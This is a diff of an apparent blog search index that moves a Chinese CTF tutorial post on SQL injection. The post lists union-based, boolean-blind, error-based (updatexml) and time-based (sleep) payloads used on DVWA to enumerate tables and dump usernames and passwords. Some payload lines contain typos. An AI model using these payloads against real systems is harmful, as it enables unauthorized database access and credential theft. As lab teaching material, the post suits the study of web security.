@@ -104,6 +104,34 @@
       </categories>
   </entry>
   <entry>
+    <title>sql注入常见代码</title>
+    <url>/2020/09/21/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<p>sql注入</p>
+<a id="more"></a>
+<h3 id="常规注入（假设表中字段数为2）"><a href="#常规注入（假设表中字段数为2）" class="headerlink" title=" 常规注入（假设表中字段数为2）"></a><font color="#FF0000"> 常规注入（假设表中字段数为2）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断字段：order by 2</span><br><span class="line">Union联合查询:  union select 1,2  </span><br><span class="line">union select 1,(database()) ----数据库dvwa  </span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database()) ----表users,guestbook  </span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’) ----字段 first_name,last_name,user,password  </span><br><span class="line">union select 1,(select group_concat(user,0x7e,password) from dvwa.users) ----查询出用户名与密码：admin、123456  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------数据库information_schema中需要记住的表：</span><br><span class="line">① Schemata表（存储该用户所有数据库的库名）需要记住该表中记录数据库库名的字段名为schema_name</span><br><span class="line">② Tables表（存储该用户创建的所有数据库的库名和表名）需要记住该表中记录数据库库名和表名的宇段名分别为table_schema和table_name</span><br><span class="line">③ columns表（存储该用户创建的所有数据库的库名、表名和宇段名）需要记住该表中记录数据库库名、表名和宇段名的字段名为table_schema、table_name和column_name</span><br><span class="line"></span><br><span class="line">一般用columns表查询，columns表存储着该用户的数据库名、表名、字段名的字段</span><br><span class="line">输出数量有限制时用limit，select (user,,0x7e,password) from dvwa.users limit 0,1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="盲注（无sql语句错误回显）"><a href="#盲注（无sql语句错误回显）" class="headerlink" title=" 盲注（无sql语句错误回显）"></a><font color="#FF0000"> 盲注（无sql语句错误回显）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询时只返回查询成功的值和失败的值，不会像union查询那样回显sql语句错误。例如分别查询1,2,3 分别换回 小明，小红，小刚。查询1’,2’,3’返回空值或其他提示（非sql语句错误之类的提示）</span><br><span class="line"></span><br><span class="line">盲注判断语句：</span><br><span class="line">① 1’ and length(database())&gt;&#x3D;1# ----判断数据库名是否大于1，如果大于1返回正常查询1的结果，反之返回其他</span><br><span class="line">② 1’ and substr(database(),1,1)&#x3D;”d”# ----substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个值（substr(database(),2,1) 表示从第二个字符开始，每次只返回一个值）</span><br><span class="line">④ 1’ and ord(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码</span><br><span class="line">⑤ 1’ and ascii(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码（与④一样）</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title=" 报错注入"></a><font color="#FF0000"> 报错注入</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">程序直接将错误信息输出到了页面上（也可使用union注入），可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml（）演示SQL语句获取user（）的值</span><br><span class="line">Sql语句：1’ and updatexml(l,concat(0x7e,(select use()），θx7e),1)#</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="时间注入（时间盲注）"><a href="#时间注入（时间盲注）" class="headerlink" title=" 时间注入（时间盲注）"></a><font color="#FF0000"> 时间注入（时间盲注）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构建错误sql查询语句时无返回查询失败的值，但是可以利用sleep()或benchmark（）等函数让MySQL的执行时间变长来进行sql注入</span><br><span class="line"></span><br><span class="line">时间盲注多与IF(expr1 ,expr2 ,expr3) 结合使用，此IF语句含义是：如果expr1是TRUE，则IF（）的返回值为expr2；否则返回值则为expr3。</span><br><span class="line">判断数据库库名长度的语句应为：</span><br><span class="line">① if(length(database())&gt;1,sleep(5),1) ----如果数据库库名的长度大于1，则MySQL查询休眠5秒，否则查询1</span><br><span class="line">② if(substr(database(),1, 1)&#x3D;’s’,sleep(5),1) ----如果数据库库名第一位是s，则MySQL查询休眠5秒，否则查询1</span><br></pre></td></tr></table></figure>
+
+<h3 id="本文未完，博主正在加班加点编写中…"><a href="#本文未完，博主正在加班加点编写中…" class="headerlink" title="本文未完，博主正在加班加点编写中…"></a>本文未完，博主正在加班加点编写中…</h3>]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
     <title>文件上传小结（基础）</title>
     <url>/2020/09/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E7%BB%93%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
     <content><![CDATA[<blockquote>
@@ -166,34 +194,6 @@
 <p>关于00截断原理的一些思考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408?utm_medium=distribute.pc_relevant.none-task-blog-title-1&spm=1001.2101.3001.4242" title="CSDN">点击加载</a></p>
 </blockquote>
 ]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入常见代码</title>
-    <url>/2020/09/21/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<p>sql注入</p>
-<a id="more"></a>
-<h3 id="常规注入（假设表中字段数为2）"><a href="#常规注入（假设表中字段数为2）" class="headerlink" title=" 常规注入（假设表中字段数为2）"></a><font color="#FF0000"> 常规注入（假设表中字段数为2）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断字段：order by 2</span><br><span class="line">Union联合查询:  union select 1,2  </span><br><span class="line">union select 1,(database()) ----数据库dvwa  </span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database()) ----表users,guestbook  </span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’) ----字段 first_name,last_name,user,password  </span><br><span class="line">union select 1,(select group_concat(user,0x7e,password) from dvwa.users) ----查询出用户名与密码：admin、123456  </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------数据库information_schema中需要记住的表：</span><br><span class="line">① Schemata表（存储该用户所有数据库的库名）需要记住该表中记录数据库库名的字段名为schema_name</span><br><span class="line">② Tables表（存储该用户创建的所有数据库的库名和表名）需要记住该表中记录数据库库名和表名的宇段名分别为table_schema和table_name</span><br><span class="line">③ columns表（存储该用户创建的所有数据库的库名、表名和宇段名）需要记住该表中记录数据库库名、表名和宇段名的字段名为table_schema、table_name和column_name</span><br><span class="line"></span><br><span class="line">一般用columns表查询，columns表存储着该用户的数据库名、表名、字段名的字段</span><br><span class="line">输出数量有限制时用limit，select (user,,0x7e,password) from dvwa.users limit 0,1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="盲注（无sql语句错误回显）"><a href="#盲注（无sql语句错误回显）" class="headerlink" title=" 盲注（无sql语句错误回显）"></a><font color="#FF0000"> 盲注（无sql语句错误回显）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询时只返回查询成功的值和失败的值，不会像union查询那样回显sql语句错误。例如分别查询1,2,3 分别换回 小明，小红，小刚。查询1’,2’,3’返回空值或其他提示（非sql语句错误之类的提示）</span><br><span class="line"></span><br><span class="line">盲注判断语句：</span><br><span class="line">① 1’ and length(database())&gt;&#x3D;1# ----判断数据库名是否大于1，如果大于1返回正常查询1的结果，反之返回其他</span><br><span class="line">② 1’ and substr(database(),1,1)&#x3D;”d”# ----substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个值（substr(database(),2,1) 表示从第二个字符开始，每次只返回一个值）</span><br><span class="line">④ 1’ and ord(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码</span><br><span class="line">⑤ 1’ and ascii(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码（与④一样）</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title=" 报错注入"></a><font color="#FF0000"> 报错注入</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">程序直接将错误信息输出到了页面上（也可使用union注入），可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml（）演示SQL语句获取user（）的值</span><br><span class="line">Sql语句：1’ and updatexml(l,concat(0x7e,(select use()），θx7e),1)#</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h3 id="时间注入（时间盲注）"><a href="#时间注入（时间盲注）" class="headerlink" title=" 时间注入（时间盲注）"></a><font color="#FF0000"> 时间注入（时间盲注）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构建错误sql查询语句时无返回查询失败的值，但是可以利用sleep()或benchmark（）等函数让MySQL的执行时间变长来进行sql注入</span><br><span class="line"></span><br><span class="line">时间盲注多与IF(expr1 ,expr2 ,expr3) 结合使用，此IF语句含义是：如果expr1是TRUE，则IF（）的返回值为expr2；否则返回值则为expr3。</span><br><span class="line">判断数据库库名长度的语句应为：</span><br><span class="line">① if(length(database())&gt;1,sleep(5),1) ----如果数据库库名的长度大于1，则MySQL查询休眠5秒，否则查询1</span><br><span class="line">② if(substr(database(),1, 1)&#x3D;’s’,sleep(5),1) ----如果数据库库名第一位是s，则MySQL查询休眠5秒，否则查询1</span><br></pre></td></tr></table></figure>
-
-<h3 id="本文未完，博主正在加班加点编写中…"><a href="#本文未完，博主正在加班加点编写中…" class="headerlink" title="本文未完，博主正在加班加点编写中…"></a>本文未完，博主正在加班加点编写中…</h3>]]></content>
       <categories>
         <category>CTF</category>
         <category>WEB</category>
